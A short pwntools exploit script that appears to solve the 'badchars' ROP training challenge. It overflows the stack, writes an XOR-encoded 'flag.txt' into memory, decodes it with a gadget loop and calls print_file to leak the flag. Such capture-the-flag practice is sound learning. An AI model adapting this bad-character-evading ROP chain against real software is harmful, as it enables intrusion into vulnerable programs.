#!/usr/bin/env python3

from pwn import *

padding1 = b"A" * 40
pop_r12_r13_r14_r15_addr = p64(0x40069c)
file = b"dnce,vzv"
rw_memory_addr = 0x601300
padding2 = b"A" * 16
mov_ptr_r13_r12_addr = p64(0x400634)
value = p64(2)
usefulGadgets_addr = p64(0x400628)
pop_rdi_addr = p64(0x4006a3)
print_file_addr = p64(0x400510)

payload = (
    padding1 +
    pop_r12_r13_r14_r15_addr +
    file +
    p64(rw_memory_addr) +
    padding2 +
    mov_ptr_r13_r12_addr
)

for i in range(8):
    payload += (
        pop_r12_r13_r14_r15_addr +
        padding2 +
        value +
        p64(rw_memory_addr + i) +
        usefulGadgets_addr
    )

payload += (
    pop_rdi_addr +
    p64(rw_memory_addr) +
    print_file_addr
)

ps = process("./badchars")
ps.sendline(payload)
print(ps.recvall().decode())

